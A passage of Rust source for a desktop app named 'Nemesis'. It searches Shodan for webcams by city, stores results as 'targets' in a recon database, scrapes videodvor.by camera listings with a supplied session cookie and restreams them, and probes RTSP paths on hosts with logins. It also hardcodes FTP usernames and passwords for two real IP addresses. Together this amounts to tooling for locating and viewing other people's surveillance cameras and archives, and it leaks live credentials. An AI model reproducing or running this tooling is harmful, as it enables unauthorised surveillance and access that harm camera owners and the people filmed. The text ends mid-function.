#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use chrono::Utc;
use dotenv::dotenv;
use futures_util::StreamExt;
use regex::Regex;
use serde::Serialize;
use std::sync::Arc;
use tokio::sync::Mutex as TokioMutex; // Чтобы не путать с std::sync::Mutex
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};
use std::env;
use std::fs::OpenOptions;
use std::net::ToSocketAddrs;
use std::path::PathBuf;
use std::process::{Command, Stdio};
mod nexus; // Подключаем наш новый файл nexus.rs
use suppaftp::FtpStream;
use tauri::State;
use tokio::sync::Mutex;
use tokio::{
    net::TcpStream,
    time::{timeout, Duration},
};
use warp::Filter;

mod videodvor_scanner;

struct StreamState {
    active_streams: std::sync::Mutex<HashMap<String, std::process::Child>>,
}

struct VideodvorState {
    scanner: Mutex<videodvor_scanner::VideodvorScanner>,
}

struct LogState {
    lines: std::sync::Mutex<Vec<String>>,
}

struct DownloadCancelState {
    cancelled_tasks: std::sync::Mutex<HashSet<String>>,
}

// 🔥 НОВЫЙ СТЕЙТ ДЛЯ ПУЛЬТА ГИПЕРИОНА
struct HyperionState {
    master_tx: TokioMutex<tokio::sync::mpsc::Sender<nexus::HyperionEvent>>,
}

fn push_runtime_log(state: &State<'_, LogState>, message: impl Into<String>) {
    let ts = Utc::now().format("%H:%M:%S").to_string();
    let line = format!("[{}] {}", ts, message.into());
    if let Ok(mut logs) = state.lines.lock() {
        logs.push(line);
        if logs.len() > 500 {
            let keep_from = logs.len().saturating_sub(500);
            logs.drain(0..keep_from);
        }
    }
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct NvrDeviceInfoResult {
    endpoint: String,
    status: String,
    body_preview: String,
}

#[derive(Debug, Serialize)]
struct ProtocolProbeResult {
    protocol: String,
    endpoint: String,
    status: String,
}

#[derive(Debug, Serialize)]
struct RoadmapItem {
    name: String,
    status: String,
}

#[derive(Debug, Serialize)]
struct ImplementationStatus {
    total: usize,
    completed: usize,
    in_progress: usize,
    pending: usize,
    left: usize,
    items: Vec<RoadmapItem>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct IsapiRecordingItem {
    endpoint: String,
    track_id: Option<String>,
    start_time: Option<String>,
    end_time: Option<String>,
    playback_uri: Option<String>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct OnvifRecordingItem {
    endpoint: String,
    token: String,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ArchiveEndpointResult {
    protocol: String,
    endpoint: String,
    method: String,
    status: String,
    status_code: Option<u16>,
}

#[derive(Debug, Serialize)]
struct PortProbeResult {
    port: u16,
    service: String,
    open: bool,
}

fn guess_service(port: u16) -> &'static str {
    match port {
        21 => "ftp/archive",
        22 => "ssh/sftp",
        80 => "http/admin",
        443 => "https/admin",
        554 => "rtsp/video",
        8080 => "http-alt/admin",
        8443 => "https-alt/admin",
        _ => "unknown",
    }
}

fn normalize_host_for_scan(input: &str) -> String {
    input
        .trim()
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .trim_start_matches("rtsp://")
        .split('/')
        .next()
        .unwrap_or_default()
        .split(':')
        .next()
        .unwrap_or_default()
        .to_string()
}

fn get_vault_path() -> PathBuf {
    let path = PathBuf::from(r"D:\Nemesis_Vault\recon_db");
    if !path.exists() {
        let _ = std::fs::create_dir_all(&path);
    }
    path
}

fn derive_hardware_key() -> [u8; 32] {
    let hw_id = machine_uid::get().unwrap_or_else(|_| "NEMESIS_ID".to_string());
    let mut hasher = Sha256::new();
    hasher.update(hw_id.as_bytes());
    let mut key = [0u8; 32];
    key.copy_from_slice(&hasher.finalize());
    key
}

// --- БАЗА ДАННЫХ ПАУКА ---
#[derive(Debug, serde::Serialize, serde::Deserialize)]
struct DeviceRecord {
    id: String,
    ip: String,
    vendor: String,
    status: String,
    first_seen: i64,
    last_seen: i64,
}

async fn save_device_to_db(device_id: &str, ip: &str, vendor: &str, status: &str) -> Result<(), String> {
    let db = sled::open(get_vault_path().join("devices_db")).map_err(|e| e.to_string())?;
    let key = format!("device:{}", device_id);
    let now = Utc::now().timestamp();
    let record = DeviceRecord {
        id: device_id.to_string(),
        ip: ip.to_string(),
        vendor: vendor.to_string(),
        status: status.to_string(),
        first_seen: now,
        last_seen: now,
    };
    let value = serde_json::to_vec(&record).map_err(|e| e.to_string())?;
    db.insert(key.as_bytes(), value).map_err(|e| e.to_string())?;
    Ok(())
}

// --- ИНТЕГРАЦИЯ SHODAN ---
// --- ИНТЕГРАЦИЯ SHODAN ---
#[tauri::command]
async fn external_search(country: String, city: String, log_state: State<'_, LogState>) -> Result<Vec<Value>, String> {
    let api_key = env::var("SHODAN_API_KEY").unwrap_or_default();
    if api_key.is_empty() { return Err("API ключ Shodan не найден в .env".into()); }

    let client = reqwest::Client::new();
    let query = format!("webcam port:80,554 country:{} city:{}", country, city);

    push_runtime_log(&log_state, format!("Поиск Shodan: {}", query));

    let url = format!(
        "https://api.shodan.io/shodan/host/search?key={}&query={}",
        api_key,
        urlencoding::encode(&query)
    );

    let res: Value = client.get(&url).send().await.map_err(|e| e.to_string())?.json().await.map_err(|e| e.to_string())?;
    let mut results = Vec::new();

    if let Some(matches) = res["matches"].as_array() {
        for m in matches {
            let ip = m["ip_str"].as_str().unwrap_or("").to_string();
            let port = m["port"].as_u64().unwrap_or(0);
            let dev_id = format!("shodan_{}", ip.replace(".", "_"));

            let _ = save_device_to_db(&dev_id, &ip, "Unknown", "Found").await;

            results.push(serde_json::json!({
                "id": dev_id,
                "ip": format!("{}:{}", ip, port),
                "status": "Добавлено в Базу"
            }));
        }
    }
    Ok(results)
}

// --- НОВЫЙ МОДУЛЬ: FFMPEG ТУННЕЛЬ ДЛЯ ХАБА ---
#[tauri::command]
fn start_hub_stream(
    target_id: String,
    user_id: String,
    channel_id: String,
    cookie: String,
    state: State<'_, StreamState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    push_runtime_log(&log_state, format!("Start hub stream: {} (user={}, ch={})", target_id, user_id, channel_id));
    let cache = get_vault_path().join("hls_cache").join(&target_id);
    let _ = std::fs::create_dir_all(&cache);

    // Очищаем старые сегменты
    cleanup_hls_cache(&cache);

    let playlist = cache.join("stream.m3u8");

    {
        let mut streams = state.active_streams.lock().unwrap();
        if let Some(mut old) = streams.remove(&target_id) {
            let _ = old.kill();
            let _ = old.wait();
        }
    }

    let url = format!(
        "https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}",
        user_id, channel_id
    );

    let headers = format!(
        "Cookie: {}\r\nReferer: https://videodvor.by/stream/admin.php\r\n",
        cookie
    );

    let child = Command::new(get_vault_path().join("ffmpeg.exe"))
        .args([
            // --- ЗАГОЛОВКИ ---
            "-headers", &headers,
            "-user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            // --- БУФЕРЫ И ТАЙМАУТЫ ---
            "-probesize", "10000000",
            "-analyzeduration", "10000000",
            "-use_wallclock_as_timestamps", "1",
            // --- РЕКОННЕКТ ---
            "-reconnect", "1",
            "-reconnect_at_eof", "1",
            "-reconnect_streamed", "1",
            "-reconnect_delay_max", "5",
            // --- ВВОД ---
            "-f", "mpjpeg",
            "-y",
            "-i", &url,
            // --- КОДИРОВАНИЕ ---
            "-c:v", "libx264",
            "-preset", "ultrafast",
            "-tune", "zerolatency",
            "-crf", "28",
            "-g", "30",
            "-sc_threshold", "0",
            "-an",
            // --- HLS ---
            "-f", "hls",
            "-hls_time", "2",
            "-hls_list_size", "5",
            "-hls_flags", "delete_segments+append_list+omit_endlist",
            "-hls_segment_type", "mpegts",
            playlist.to_str().unwrap(),
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;

    state
        .active_streams
        .lock()
        .unwrap()
        .insert(target_id, child);
    Ok("Started".into())
}

// --- ИСПРАВЛЕННЫЙ СКАНЕР: НАХОДИТ ВСЕ КАНАЛЫ (КАМЕРЫ) ---
#[tauri::command]
async fn search_global_hub(query: String, cookie: String) -> Result<Vec<Value>, String> {
    let client = reqwest::Client::new();
    let encoded_query = urlencoding::encode(&query);
    let url = format!(
        "https://videodvor.by/stream/check.php?search={}",
        encoded_query
    );

    let res = client
        .get(&url)
        .header("Cookie", cookie)
        .send()
        .await
        .map_err(|e| e.to_string())?
        .text()
        .await
        .map_err(|e| e.to_string())?;

    let mut results = Vec::new();
    let blocks: Vec<&str> = res.split("<div class=\"name-blok\">").collect();

    let re_user = Regex::new(r#"<b>USER\s*(\d+)</b>\s*\((.*?)\)</div>"#).unwrap();
    let re_channels = Regex::new(r#"id=(\d+)""#).unwrap();

    for block in blocks.iter().skip(1) {
        if let Some(caps) = re_user.captures(block) {
            let user_id = caps[1].to_string();
            let address = caps[2].to_string();

            let mut channels = Vec::new();
            for ch_caps in re_channels.captures_iter(block) {
                channels.push(ch_caps[1].to_string());
            }
            if channels.is_empty() {
                channels.push("0".to_string());
            }

            results.push(serde_json::json!({
                "id": user_id,
                "ip": address,
                "channels": channels
            }));
        }
    }
    Ok(results)
}

fn start_background_scheduler() {
    std::thread::spawn(|| {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            loop {
                tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
            }
        });
    });
}

#[tauri::command]
fn save_target(target_id: String, payload: String) -> Result<String, String> {
    let db = sled::open(get_vault_path().join("targets_vault"))
        .map_err(|e: sled::Error| e.to_string())?;
    let cipher = Aes256Gcm::new(&derive_hardware_key().into());
    let encrypted_data = cipher
        .encrypt(Nonce::from_slice(b"nemesis_salt"), payload.as_bytes())
        .map_err(|_| "Encryption error".to_string())?;
    db.insert(target_id.as_bytes(), encrypted_data)
        .map_err(|e: sled::Error| e.to_string())?;
    Ok("Saved".into())
}

#[tauri::command]
fn read_target(target_id: String) -> Result<String, String> {
    let db = sled::open(get_vault_path().join("targets_vault"))
        .map_err(|e: sled::Error| e.to_string())?;
    if let Some(data) = db
        .get(target_id.as_bytes())
        .map_err(|e: sled::Error| e.to_string())?
    {
        let cipher = Aes256Gcm::new(&derive_hardware_key().into());
        let decrypted = cipher
            .decrypt(Nonce::from_slice(b"nemesis_salt"), data.as_ref())
            .map_err(|_| "Access denied".to_string())?;
        String::from_utf8(decrypted).map_err(|_| "UTF-8 error".to_string())
    } else {
        Err("Not found".to_string())
    }
}

#[tauri::command]
fn get_all_targets() -> Result<Vec<String>, String> {
    let db = sled::open(get_vault_path().join("targets_vault"))
        .map_err(|e: sled::Error| e.to_string())?;
    let mut keys = Vec::new();
    for k in db.iter().keys() {
        if let Ok(key_bytes) = k {
            if let Ok(s) = String::from_utf8(key_bytes.to_vec()) {
                keys.push(s);
            }
        }
    }
    Ok(keys)
}

#[tauri::command]
fn delete_target(target_id: String) -> Result<String, String> {
    let db = sled::open(get_vault_path().join("targets_vault"))
        .map_err(|e: sled::Error| e.to_string())?;
    db.remove(target_id.as_bytes())
        .map_err(|e: sled::Error| e.to_string())?;
    Ok("Deleted".into())
}

#[tauri::command]
async fn probe_rtsp_path(host: String, login: String, pass: String) -> Result<String, String> {
    let signatures = vec![
        "/Streaming/Channels/101",
        "/cam/realmonitor?channel=1&subtype=0",
        "/live/ch1",
    ];
    let ffmpeg = get_vault_path().join("ffmpeg.exe");
    for sig in signatures {
        let url = format!(
            "rtsp://{}:{}@{}/{}",
            login,
            pass,
            host,
            sig.trim_start_matches('/')
        );
        let s = Command::new(&ffmpeg)
            .args([
                "-rtsp_transport",
                "tcp",
                "-i",
                &url,
                "-t",
                "0.1",
                "-f",
                "null",
                "-",
            ])
            .status();
        if let Ok(status) = s {
            if status.success() {
                return Ok(sig.to_string());
            }
        }
    }
    Err("Recon failed".into())
}

#[tauri::command]
async fn geocode_address(address: String) -> Result<(f64, f64), String> {
    let encoded = urlencoding::encode(&address);
    let url = format!(
        "https://nominatim.openstreetmap.org/search?q={}&format=json&limit=1",
        encoded
    );
    let client = reqwest::Client::builder()
        .user_agent("Nemesis")
        .build()
        .unwrap();
    let res = client.get(&url).send().await.map_err(|e| e.to_string())?;
    let data: Vec<Value> = res.json().await.map_err(|e| e.to_string())?;
    if data.is_empty() {
        return Err("Empty".into());
    }
    let lat = data[0]["lat"].as_str().unwrap().parse::<f64>().unwrap();
    let lon = data[0]["lon"].as_str().unwrap().parse::<f64>().unwrap();
    Ok((lat, lon))
}

#[tauri::command]
fn generate_nvr_channels(_vendor: String, channel_count: u32) -> Result<Vec<Value>, String> {
    let mut channels = Vec::new();
    for i in 1..=channel_count {
        channels.push(serde_json::json!({ "id": format!("ch{}", i), "index": i, "name": format!("Cam {}", i) }));
    }
    Ok(channels)
}

/// Очистка старых HLS-файлов перед запуском нового стрима
fn cleanup_hls_cache(cache_dir: &std::path::Path) {
    if cache_dir.exists() {
        if let Ok(entries) = std::fs::read_dir(cache_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                    if ext == "m3u8" || ext == "ts" {
                        let _ = std::fs::remove_file(&path);
                    }
                }
            }
        }
    }
}

#[tauri::command]
fn start_stream(
    target_id: String,
    rtsp_url: String,
    state: State<'_, StreamState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    push_runtime_log(&log_state, format!("Start stream: {}", target_id));
    let cache = get_vault_path().join("hls_cache").join(&target_id);
    let _ = std::fs::create_dir_all(&cache);

    // Очищаем старые сегменты перед запуском — иначе плеер подхватит протухшие .ts
    cleanup_hls_cache(&cache);

    let playlist = cache.join("stream.m3u8");
    {
        let mut streams = state.active_streams.lock().unwrap();
        if let Some(mut old) = streams.remove(&target_id) {
            let _ = old.kill();
            let _ = old.wait(); // Дожидаемся завершения чтобы освободить файлы
        }
    }
    let child = Command::new(get_vault_path().join("ffmpeg.exe"))
        .args([
            "-y",
            "-rtsp_transport", "tcp",
            "-i", &rtsp_url,

            // --- ТРАНСКОДЕР (HEVC -> H.264) ---
            "-c:v", "libx264",
            "-preset", "ultrafast",     // Максимальная скорость кодирования
            "-tune", "zerolatency",     // Убираем задержку (буферизацию)
            "-pix_fmt", "yuv420p",      // Строгий формат цвета для Chrome/Web
            "-g", "30",                 // 🔥 ГЕНЕРИРОВАТЬ КЛЮЧЕВОЙ КАДР КАЖДЫЕ 30 КАДРОВ (1 СЕК) 🔥
            "-an",                      // Без звука

            // --- СБОРКА HLS ---
            "-f", "hls",
            "-hls_time", "2",
            "-hls_list_size", "5",
            "-hls_flags", "delete_segments+append_list+omit_endlist",
            playlist.to_str().unwrap(),
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;
    state
        .active_streams
        .lock()
        .unwrap()
        .insert(target_id, child);
    Ok("Started".into())
}

/// Проверка: жив ли FFmpeg процесс для данного стрима
#[tauri::command]
fn check_stream_alive(
    target_id: String,
    state: State<'_, StreamState>,
) -> Result<bool, String> {
    let mut streams = state.active_streams.lock().unwrap();
    if let Some(child) = streams.get_mut(&target_id) {
        match child.try_wait() {
            Ok(Some(_status)) => {
                // Процесс завершился — стрим мёртв
                streams.remove(&target_id);
                Ok(false)
            }
            Ok(None) => Ok(true),     // Ещё работает
            Err(_) => Ok(false),
        }
    } else {
        Ok(false)
    }
}

/// Перезапуск стрима: kill → cleanup → start заново
#[tauri::command]
fn restart_stream(
    target_id: String,
    rtsp_url: String,
    state: State<'_, StreamState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    push_runtime_log(&log_state, format!("Restart stream: {}", target_id));

    // 1. Убиваем старый процесс
    {
        let mut streams = state.active_streams.lock().unwrap();
        if let Some(mut old) = streams.remove(&target_id) {
            let _ = old.kill();
            let _ = old.wait();
        }
    }

    // 2. Чистим HLS-кэш
    let cache = get_vault_path().join("hls_cache").join(&target_id);
    cleanup_hls_cache(&cache);

    // 3. Запускаем заново (делегируем в start_stream)
    start_stream(target_id, rtsp_url, state, log_state)
}

#[tauri::command]
fn stop_stream(
    target_id: String,
    state: State<'_, StreamState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    if let Some(mut child) = state.active_streams.lock().unwrap().remove(&target_id) {
        let _ = child.kill();
        push_runtime_log(&log_state, format!("Stop stream: {}", target_id));
        Ok("Stopped".into())
    } else {
        Ok("Inactive".into())
    }
}

// --- НОВЫЙ БЛОК FTP-НАВИГАТОРА ---

#[derive(serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct FtpFolder {
    pub name: String,
    pub path: String,
    pub is_file: bool,
}

struct FtpConfig {
    host: &'static str,
    user: &'static str,
    pass: &'static str,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct DownloadReport {
    server_alias: String,
    filename: String,
    save_path: String,
    bytes_written: u64,
    total_bytes: u64,
    duration_ms: u128,
    resumed: bool,
    skipped_as_complete: bool,
}

fn sanitize_filename_component(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for ch in input.chars() {
        if ch.is_ascii_alphanumeric() || ch == '.' || ch == '_' || ch == '-' {
            out.push(ch);
        } else {
            out.push('_');
        }
    }
    let trimmed = out.trim_matches('_');
    if trimmed.is_empty() {
        "recording".into()
    } else {
        trimmed.to_string()
    }
}

fn resolve_ftp_config(server_alias: &str) -> Result<FtpConfig, String> {
    match server_alias {
        "video1" => Ok(FtpConfig {
            host: "93.125.48.66:21",
            user: "mvd",
            pass: "gpfZrw%9RVqp",
        }),
        "video2" => Ok(FtpConfig {
            host: "93.125.48.100:21",
            user: "mvd",
            pass: "gpfZrw%9RVqp",
        }),
        _ => Err(format!("Неизвестный сервер: {}", server_alias)),
    }
}

// =============================================================================
// RELAY: FTP через HTTP-прокси на ПК 2
// =============================================================================

/// Получить список файлов через relay
#[tauri::command]
async fn relay_list_files(
    relay_url: String,
    relay_token: Option<String>,
    server_alias: String,
    folder_path: Option<String>,
    log_state: State<'_, LogState>,
) -> Result<Vec<FtpFolder>, String> {
    let path = folder_path.unwrap_or_else(|| "/".to_string());
    push_runtime_log(&log_state, format!("RELAY list: {} {}", server_alias, path));

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .map_err(|e| e.to_string())?;

    let url = format!(
        "{}/api/list?server={}&path={}",
        relay_url.trim_end_matches('/'),
        urlencoding::encode(&server_alias),
        urlencoding::encode(&path)
    );

    let mut req = client.get(&url);
    if let Some(ref token) = relay_token {
        req = req.header("Authorization", format!("Bearer {}", token));
    }

    let resp = req.send().await.map_err(|e| format!("Relay connection error: {}", e))?;

    if !resp.status().is_success() {
        let status = resp.status(); // 1. Сначала запоминаем статус в отдельную переменную
        let body = resp.text().await.unwrap_or_default(); // 2. Теперь безопасно "съедаем" resp, читая текст
        return Err(format!("Relay error HTTP {}: {}", status, body)); // 3. Используем сохраненный статус
    }

    let items: Vec<FtpFolder> = resp.json().await.map_err(|e| e.to_string())?;
    push_runtime_log(&log_state, format!("RELAY list done: {} items", items.len()));
    Ok(items)
}

/// Скачать файл через relay и сохранить локально
#[tauri::command]
async fn relay_download_file(
    relay_url: String,
    relay_token: Option<String>,
    server_alias: String,
    folder_path: String,
    filename: String,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    let task_key = task_id.unwrap_or_else(|| format!("relay_{}_{}", server_alias, Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    push_runtime_log(&log_state, format!(
        "RELAY download: {}/{}/{} [task:{}]", server_alias, folder_path, filename, task_key
    ));

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(600)) // 10 мин на большие файлы
        .build()
        .map_err(|e| e.to_string())?;

    let url = format!(
        "{}/api/download?server={}&path={}&filename={}",
        relay_url.trim_end_matches('/'),
        urlencoding::encode(&server_alias),
        urlencoding::encode(&folder_path),
        urlencoding::encode(&filename)
    );

    let mut req = client.get(&url);
    if let Some(ref token) = relay_token {
        req = req.header("Authorization", format!("Bearer {}", token));
    }

    let started = std::time::Instant::now();
    let resp = req.send().await.map_err(|e| format!("Relay connection error: {}", e))?;

    if !resp.status().is_success() {
        let body = resp.text().await.unwrap_or_default();
        return Err(format!("Relay download error: {}", body));
    }

    let total_size = resp.content_length().unwrap_or(0);
    let safe_name = sanitize_filename_component(&filename);
    let path = get_vault_path()
        .join("archives")
        .join(&server_alias)
        .join(if safe_name.is_empty() { "download.mkv" } else { &safe_name });
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let mut stream = resp.bytes_stream();
    let mut file = OpenOptions::new()
        .create(true).write(true).truncate(true)
        .open(&path).map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let progress_step = 2 * 1024 * 1024u64;
    let mut next_mark = progress_step;

    while let Some(chunk) = stream.next().await {
        if cancel_state.cancelled_tasks.lock().map(|s| s.contains(&task_key)).unwrap_or(false) {
            let _ = std::fs::remove_file(&path);
            push_runtime_log(&log_state, format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename));
            return Err(format!("Relay download cancelled [task:{}]", task_key));
        }

        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        bytes_written += data.len() as u64;

        if bytes_written >= next_mark {
            push_runtime_log(&log_state, format!(
                "DOWNLOAD_PROGRESS|{}|{}|{}", task_key, bytes_written, total_size.max(bytes_written)
            ));
            next_mark += progress_step;
        }
    }

    let duration_ms = started.elapsed().as_millis();
    push_runtime_log(&log_state, format!(
        "RELAY download done: {} ({} bytes, {}ms) [task:{}]", filename, bytes_written, duration_ms, task_key
    ));

    Ok(DownloadReport {
        server_alias: server_alias.to_string(),
        filename: safe_name,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes: total_size.max(bytes_written),
        duration_ms,
        resumed: false,
        skipped_as_complete: false,
    })
}

/// Проверить что relay доступен
#[tauri::command]
async fn relay_ping(
    relay_url: String,
    relay_token: Option<String>,
) -> Result<Value, String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .map_err(|e| e.to_string())?;

    let url = format!("{}/api/ping", relay_url.trim_end_matches('/'));
    let mut req = client.get(&url);
    if let Some(ref token) = relay_token {
        req = req.header("Authorization", format!("Bearer {}", token));
    }

    let resp = req.send().await.map_err(|e| format!("Relay недоступен: {}", e))?;
    let data: Value = resp.json().await.map_err(|e| e.to_string())?;
    Ok(data)
}

fn resolve_socket_addrs(host: &str) -> Result<Vec<std::net::SocketAddr>, String> {
    host.to_socket_addrs()
        .map(|iter| iter.collect::<Vec<_>>())
        .map_err(|e| format!("Не удалось резолвить FTP хост {}: {}", host, e))
        .and_then(|addrs| {
            if addrs.is_empty() {
                Err(format!("FTP хост {} не вернул ни одного адреса", host))
            } else {
                Ok(addrs)
            }
        })
}

fn ftp_banner_probe(host: &str, attempts: usize) -> Result<String, String> {
    let mut last_err = String::from("FTP preflight не выполнился");

    let addrs = resolve_socket_addrs(host).ok();

    for attempt in 1..=attempts {
        println!(
            "[FTP PREFLIGHT] попытка {}/{} -> {}",
            attempt, attempts, host
        );

        let mut connected = false;

        if let Some(addrs) = &addrs {
            for connect_addr in addrs {
                match std::net::TcpStream::connect_timeout(
                    connect_addr,
                    std::time::Duration::from_secs(3),
                ) {
                    Ok(mut stream) => {
                        connected = true;
                        let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
                        let _ = stream.set_write_timeout(Some(std::time::Duration::from_secs(5)));

                        let mut buf = [0u8; 512];
                        match std::io::Read::read(&mut stream, &mut buf) {
                            Ok(n) if n > 0 => {
                                let banner = String::from_utf8_lossy(&buf[..n]).trim().to_string();
                                println!("[FTP PREFLIGHT] banner: {}", banner);
                                return Ok(banner);
                            }
                            Ok(_) => {
                                let _ = std::io::Write::write_all(&mut stream, b"NOOP\r\n");
                                match std::io::Read::read(&mut stream, &mut buf) {
                                    Ok(n2) if n2 > 0 => {
                                        let banner =
                                            String::from_utf8_lossy(&buf[..n2]).trim().to_string();
                                        println!("[FTP PREFLIGHT] late banner: {}", banner);
                                        return Ok(banner);
                                    }
                                    _ => {
                                        last_err =
                                            format!("Пустой ответ баннера FTP от {}", connect_addr);
                                    }
                                }
                            }
                            Err(e) => {
                                last_err =
                                    format!("Ошибка чтения баннера FTP от {}: {}", connect_addr, e);
                            }
                        }
                    }
                    Err(e) => {
                        last_err = format!("Ошибка TCP подключения к FTP {}: {}", connect_addr, e);
                    }
                }
            }
        }

        if !connected {
            match std::net::TcpStream::connect(host) {
                Ok(mut stream) => {
                    let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
                    let _ = stream.set_write_timeout(Some(std::time::Duration::from_secs(5)));
                    let mut buf = [0u8; 512];
                    match std::io::Read::read(&mut stream, &mut buf) {
                        Ok(n) if n > 0 => {
                            let banner = String::from_utf8_lossy(&buf[..n]).trim().to_string();
                            println!("[FTP PREFLIGHT] direct banner: {}", banner);
                            return Ok(banner);
                        }
                        _ => {
                            last_err = format!("Пустой/невалидный прямой banner для {}", host);
                        }
                    }
                }
                Err(e) => {
                    last_err = format!("Ошибка прямого TCP подключения к FTP {}: {}", host, e);
                }
            }
        }

        std::thread::sleep(std::time::Duration::from_millis(350));
    }

    Err(last_err)
}

fn ftp_connect_with_retry(
    host: &str,
    user: &str,
    pass: &str,
    max_retries: usize,
) -> Result<suppaftp::FtpStream, String> {
    let mut delay_ms: u64 = 2000; // Стартуем с 2 секунд
    let mut last_err = String::new();

    for attempt in 1..=max_retries {
        println!("[FTP ЦМУС] Попытка {}/{} -> {} (Ожидание: {}ms)", attempt, max_retries, host, delay_ms);

        match suppaftp::FtpStream::connect(host) {
            Ok(mut ftp) => {
                match ftp.login(user, pass.trim()) {
                    Ok(_) => return Ok(ftp),
                    Err(e) => {
                        last_err = format!("Ошибка авторизации: {}", e);
                        // Ошибка кредов критична, обрываем попытки
                        return Err(last_err);
                    }
                }
            }
            Err(e) => {
                last_err = format!("Ошибка TCP: {}", e);
                println!("[FTP ЦМУС] Сбой: {}. Переподключение через {}ms", e, delay_ms);
                // Засыпаем и увеличиваем время ожидания в 2 раза (2s, 4s, 8s)
                std::thread::sleep(std::time::Duration::from_millis(delay_ms));
                delay_ms *= 2;
            }
        }
    }
    Err(format!("Превышен лимит попыток. Последняя ошибка: {}", last_err))
}

fn ftp_nlst_root_with_fallback(ftp: &mut FtpStream) -> Result<Vec<String>, String> {
    let mut last_err = String::new();

    for candidate in [Some("/"), Some("."), None] {
        match ftp.nlst(candidate) {
            Ok(items) if !items.is_empty() => return Ok(items),
            Ok(_) => {
                last_err = format!("FTP nlst вернул пустой список для {:?}", candidate);
            }
            Err(e) => {
                last_err = format!("FTP nlst ошибка для {:?}: {}", candidate, e);
            }
        }
    }

    match ftp.list(Some("/")) {
        Ok(lines) if !lines.is_empty() => {
            let mut items = Vec::new();
            for line in lines {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                let name = trimmed
                    .split_whitespace()
                    .last()
                    .map(|s| s.trim().trim_start_matches('/').to_string())
                    .unwrap_or_default();
                if !name.is_empty() {
                    items.push(name);
                }
            }
            if !items.is_empty() {
                return Ok(items);
            }
            last_err = "FTP list fallback вернул пустой список".into();
        }
        Ok(_) => {
            last_err = "FTP list fallback вернул пустой ответ".into();
        }
        Err(e) => {
            last_err = format!("FTP list fallback ошибка: {}", e);
        }
    }

    Err(last_err)
}

#[tauri::command]
fn get_ftp_folders(
    server_alias: &str,
    folder_path: Option<String>,
    log_state: State<'_, LogState>,
) -> Result<Vec<FtpFolder>, String> {
    push_runtime_log(&log_state, format!("FTP list requested for server {}", server_alias));

    let cfg = resolve_ftp_config(server_alias)?;

    // 1. Подключаемся через нашу новую функцию с бэкоффом
    let mut ftp = ftp_connect_with_retry(cfg.host, cfg.user, cfg.pass, 3)?;

    let current_path = folder_path.unwrap_or_else(|| "/".to_string());
    if current_path != "/" && !current_path.is_empty() {
        if let Err(e) = ftp.cwd(&current_path) {
            push_runtime_log(&log_state, format!("FTP cwd failed to {}: {}", current_path, e));
        }
    }

    // 2. Интеллектуальное переключение режимов
    let mut list_result = Err(String::from("Инициализация"));

    // Попытка 1: Пассивный режим
    ftp.set_mode(suppaftp::Mode::Passive);
    push_runtime_log(&log_state, "Пробуем Пассивный (Passive) режим...".to_string());

    match ftp_nlst_root_with_fallback(&mut ftp) {
        Ok(items) => {
            push_runtime_log(&log_state, "Пассивный режим сработал!".to_string());
            list_result = Ok(items);
        }
        Err(e) => {
            push_runtime_log(&log_state, format!("Пассивный режим заблокирован: {}. Пробуем Active...", e));

            // Попытка 2: Активный режим (Fallback)
            ftp.set_mode(suppaftp::Mode::Active);

            match ftp_nlst_root_with_fallback(&mut ftp) {
                Ok(items) => {
                    push_runtime_log(&log_state, "Активный режим успешно пробил файрвол!".to_string());
                    list_result = Ok(items);
                }
                Err(e_act) => {
                    list_result = Err(format!("Оба режима отклонены сервером. Passive: {}, Active: {}", e, e_act));
                }
            }
        }
    }

    let list = list_result?;
    let mut folders = Vec::new();

    for item in list {
        let name = item.trim_start_matches('/').to_string();
        if name == "." || name == ".." || name.is_empty() {
            continue;
        }

        let is_file = name.contains('.') && name.rfind('.').unwrap_or(0) > name.len().saturating_sub(6);
        let full_path = if current_path.ends_with('/') {
            format!("{}{}", current_path, name)
        } else {
            format!("{}/{}", current_path, name)
        };

        folders.push(FtpFolder { name, path: full_path, is_file });
    }

    let _ = ftp.quit();
